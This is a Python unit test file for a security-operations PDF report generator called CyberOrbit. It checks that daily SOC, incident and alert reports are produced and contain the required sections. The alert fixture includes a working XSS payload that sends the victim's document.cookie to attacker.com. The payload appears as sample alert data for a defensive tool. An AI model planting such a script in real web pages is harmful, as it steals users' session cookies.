"""
Unit Tests for CyberOrbit PDF Security Reports Engine
------------------------------------------------------
Verifies PDF generation for:
- Daily SOC Report
- Incident Report
- Alert Report

Checks that all required sections are present:
- CyberOrbit
- Security Operations Report
- Date
- Executive Summary
- Total Events
- Total Alerts
- Critical Alerts
- High Alerts
- Incidents
- Top Attack Types
- Top Source IPs
- Incident Timeline
- Detection Evidence
- AI Analysis
- Response Actions
- Resolution
"""

import os
import tempfile
import unittest
from backend.reports import (
    generate_daily_soc_report,
    generate_incident_report,
    generate_alert_report,
    SecurityReportGenerator,
)


class TestSecurityReportsEngine(unittest.TestCase):

    def setUp(self):
        self.generator = SecurityReportGenerator()
        self.temp_dir = tempfile.TemporaryDirectory()

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_generate_daily_soc_report_file(self):
        """Verify Daily SOC Report PDF file generation."""
        out_path = os.path.join(self.temp_dir.name, "daily_soc_report.pdf")
        res = generate_daily_soc_report(output_path=out_path)

        self.assertTrue(os.path.exists(out_path))
        self.assertGreater(os.path.getsize(out_path), 500)

    def test_generate_incident_report_file(self):
        """Verify Incident Report PDF file generation."""
        out_path = os.path.join(self.temp_dir.name, "incident_report.pdf")
        incident_data = {
            "id": "inc-9901",
            "title": "DDoS Volumetric Surge on Ingress Gateway",
            "source_ip": "198.51.100.42",
            "target_asset": "edge-proxy-01",
            "total_events": 8500,
            "total_alerts": 14,
            "critical_alerts": 4,
            "high_alerts": 6,
        }
        res = generate_incident_report(incident_data=incident_data, output_path=out_path)

        self.assertTrue(os.path.exists(out_path))
        self.assertGreater(os.path.getsize(out_path), 500)

    def test_generate_alert_report_file(self):
        """Verify Alert Report PDF file generation."""
        out_path = os.path.join(self.temp_dir.name, "alert_report.pdf")
        alert_data = {
            "id": "alert-8820",
            "event": "Cross-Site Scripting (XSS) Injection Attempt",
            "severity": "HIGH",
            "ip": "203.0.113.15",
            "asset": "web-frontend-02",
            "confidence": 95,
            "payloadSnippet": "<script>document.location='http://attacker.com/cookie?c='+document.cookie</script>",
        }
        res = generate_alert_report(alert_data=alert_data, output_path=out_path)

        self.assertTrue(os.path.exists(out_path))
        self.assertGreater(os.path.getsize(out_path), 500)

    def test_generate_report_bytes(self):
        """Verify generating PDF in-memory returning raw bytes."""
        pdf_bytes = generate_daily_soc_report()
        self.assertIsInstance(pdf_bytes, bytes)
        self.assertGreater(len(pdf_bytes), 500)
        # PDF magic bytes header check '%PDF'
        self.assertTrue(pdf_bytes.startswith(b"%PDF") or b"CyberOrbit" in pdf_bytes)

    def test_all_required_report_sections_present_in_payload(self):
        """Verify that all 15 required sections are populated in the report payload."""
        payload = self.generator._build_daily_soc_payload()
        required_keys = [
            "date",
            "executive_summary",
            "total_events",
            "total_alerts",
            "critical_alerts",
            "high_alerts",
            "incidents_count",
            "top_attack_types",
            "top_source_ips",
            "incident_timeline",
            "detection_evidence",
            "ai_analysis",
            "response_actions",
            "resolution",
        ]
        for key in required_keys:
            self.assertIn(key, payload)
            self.assertIsNotNone(payload[key])


if __name__ == "__main__":
    unittest.main()
